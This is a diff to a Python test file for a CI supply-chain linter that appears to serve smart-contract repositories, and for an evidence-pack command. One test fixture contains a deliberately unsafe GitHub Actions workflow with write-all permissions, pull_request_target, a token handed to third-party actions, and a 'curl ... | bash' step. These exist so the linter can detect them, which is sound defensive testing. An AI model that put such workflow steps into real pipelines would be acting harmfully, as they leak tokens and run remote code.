@@ -26,6 +26,7 @@ from contract_guard_ci.false_positives import false_positive_review_payload, ren
 from contract_guard_ci.fuzzing import fuzz_hooks_payload, render_fuzz_hooks_markdown
 from contract_guard_ci.invariants import invariant_payload, render_invariant_markdown
 from contract_guard_ci.policy import load_policy, render_policy_markdown
+from contract_guard_ci.workflow_safety import render_workflow_safety_markdown, workflow_safety_payload
 
 ROOT = Path(__file__).resolve().parents[1]
 
@@ -1521,6 +1522,189 @@ def test_cli_dogfood_readiness_runs_defi_vault_fixture() -> None:
     assert plan["summary"]["foundry_project"] is True
     assert plan["summary"]["solidity_files"] == 2
 
+
+def test_cli_evidence_pack_generates_local_bundle_without_external_services() -> None:
+    with TemporaryDirectory() as tmp:
+        output_dir = Path(tmp) / "evidence-pack"
+        proc = run_cli(
+            "evidence-pack",
+            "--repo",
+            "examples/foundry-defi-vault",
+            "--output-dir",
+            str(output_dir),
+            "--repo-label",
+            "foundry-defi-vault",
+            "--format",
+            "json",
+        )
+        assert proc.returncode == 0, proc.stderr
+        payload = json.loads(proc.stdout)
+        manifest = json.loads((output_dir / "manifest.json").read_text(encoding="utf-8"))
+        plan_text = (output_dir / "deterministic-evidence" / "plan.json").read_text(encoding="utf-8")
+        scan_text = (output_dir / "deterministic-evidence" / "scan.json").read_text(encoding="utf-8")
+
+    assert payload["schema"] == "contract_guard_evidence_pack/v1"
+    assert payload["status"] == "passed"
+    assert payload["pack_status"] == "ready_for_human_review"
+    assert payload["safety"]["external_services_used"] is False
+    assert payload["safety"]["hosted_upload_required"] is False
+    assert payload["safety"]["private_snippets_included"] is False
+    assert payload["safety"]["live_ai_provider_called"] is False
+    assert payload["safety"]["payment_or_custody_scope"] is False
+    assert payload["safety"]["audit_or_compliance_claim"] is False
+    assert {command["name"] for command in payload["commands"]} == {
+        "plan",
+        "policy",
+        "workflow-check",
+        "scan-json",
+        "scan-markdown",
+        "scan-sarif",
+    }
+    assert all(command["ok"] for command in payload["commands"])
+    assert all(check["ok"] for check in payload["checks"])
+    assert manifest["schema_version"] == "contract_guard_pre_audit_evidence_pack/v0.1"
+    assert manifest["source_of_truth"] == "deterministic_tools"
+    assert manifest["advisory_ai_included"] is False
+    assert manifest["hosted_upload_required"] is False
+    assert manifest["repo_context"]["repo_label"] == "foundry-defi-vault"
+    assert manifest["repo_context"]["foundry_detected"] is True
+    assert "not_an_audit" in manifest["non_claims"]
+    assert str(ROOT) not in json.dumps(manifest)
+    assert str(ROOT) not in plan_text
+    assert str(ROOT) not in scan_text
+
+
+def test_cli_evidence_pack_markdown_states_boundaries() -> None:
+    with TemporaryDirectory() as tmp:
+        output_dir = Path(tmp) / "evidence-pack"
+        proc = run_cli(
+            "evidence-pack",
+            "--repo",
+            "examples/foundry-basic",
+            "--output-dir",
+            str(output_dir),
+            "--format",
+            "markdown",
+        )
+        assert proc.returncode == 0, proc.stderr
+        readme = (output_dir / "README.md").read_text(encoding="utf-8")
+        data_flow = (output_dir / "workflow-and-supply-chain" / "data-flow.md").read_text(encoding="utf-8")
+        readiness = (output_dir / "human-review" / "readiness-summary.md").read_text(encoding="utf-8")
+
+    assert "Contract Guard Pre-Audit Evidence Pack" in proc.stdout
+    assert "hosted_upload_required: `false`" in proc.stdout
+    assert "live_ai_provider_called: `false`" in proc.stdout
+    assert "payment_or_custody_scope: `false`" in proc.stdout
+    assert "not_an_audit" in proc.stdout
+    assert "not an audit, proof, guarantee" in readme
+    assert "No hosted upload, live AI provider call, private snippet sharing" in data_flow
+    assert "not an audit, not formal verification, not a guarantee" in readiness
+
+def test_workflow_safety_flags_known_risky_actions_and_permissions() -> None:
+    with TemporaryDirectory() as tmp:
+        repo = Path(tmp)
+        workflow_dir = repo / ".github" / "workflows"
+        workflow_dir.mkdir(parents=True)
+        (workflow_dir / "security.yml").write_text(
+            """
+name: bad
+on: [pull_request_target]
+permissions: write-all
+jobs:
+  security:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: harunosakura030303-maker/solidity-audit-action@v1
+      - uses: harunosakura030303-maker/solidity-gas-reporter-action@v1
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      - run: npm install evmchain-config
+      - run: curl https://example.invalid/install.sh | bash
+""".lstrip(),
+            encoding="utf-8",
+        )
+
+        payload = workflow_safety_payload(repo)
+
+    assert payload["schema"] == "contract_guard_workflow_safety/v1"
+    assert payload["ok"] is False
+    rule_ids = {finding["rule_id"] for finding in payload["findings"]}
+    assert {
+        "known_risky_action",
+        "mutable_action_ref",
+        "broad_permissions_write_all",
+        "pull_request_target",
+        "known_risky_npm_package",
+        "pipe_remote_script_to_shell",
+        "github_token_with_third_party_action",
+    }.issubset(rule_ids)
+    markdown = render_workflow_safety_markdown(payload)
+    assert "deterministic CI supply-chain lint" in markdown
+    assert "not a complete audit" in markdown
+
+
+def test_workflow_safety_allows_minimal_local_foundry_ci() -> None:
+    pinned_ref = "a" * 40
+    with TemporaryDirectory() as tmp:
+        repo = Path(tmp)
+        workflow_dir = repo / ".github" / "workflows"
+        workflow_dir.mkdir(parents=True)
+        (workflow_dir / "foundry.yml").write_text(
+            f"""
+name: foundry
+on: [push, pull_request]
+permissions:
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@{pinned_ref}
+      - uses: foundry-rs/foundry-toolchain@{pinned_ref}
+      - run: forge build
+      - run: forge test
+""".lstrip(),
+            encoding="utf-8",
+        )
+
+        payload = workflow_safety_payload(repo)
+
+    assert payload["ok"] is True
+    assert payload["findings"] == []
+    assert payload["summary"]["workflow_files"] == 1
+
+
+def test_cli_workflow_check_fails_on_high_risk_workflow() -> None:
+    with TemporaryDirectory() as tmp:
+        repo = Path(tmp)
+        workflow_dir = repo / ".github" / "workflows"
+        workflow_dir.mkdir(parents=True)
+        (workflow_dir / "security.yml").write_text(
+            """
+name: bad
+on: [pull_request]
+permissions: write-all
+jobs:
+  security:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: harunosakura030303-maker/solidity-audit-action@v1
+""".lstrip(),
+            encoding="utf-8",
+        )
+
+        proc = run_cli("workflow-check", "--repo", str(repo), "--format", "json")
+        markdown_proc = run_cli("workflow-check", "--repo", str(repo), "--format", "markdown")
+
+    assert proc.returncode == 1
+    payload = json.loads(proc.stdout)
+    assert payload["schema"] == "contract_guard_workflow_safety/v1"
+    assert payload["status"] == "needs_attention"
+    assert any(finding["severity"] == "high" for finding in payload["findings"])
+    assert markdown_proc.returncode == 1
+    assert "Contract Guard Workflow Safety Check" in markdown_proc.stdout
+    assert "deterministic CI supply-chain lint" in markdown_proc.stdout
 
 if __name__ == "__main__":
     test_plan_json_for_empty_repo()
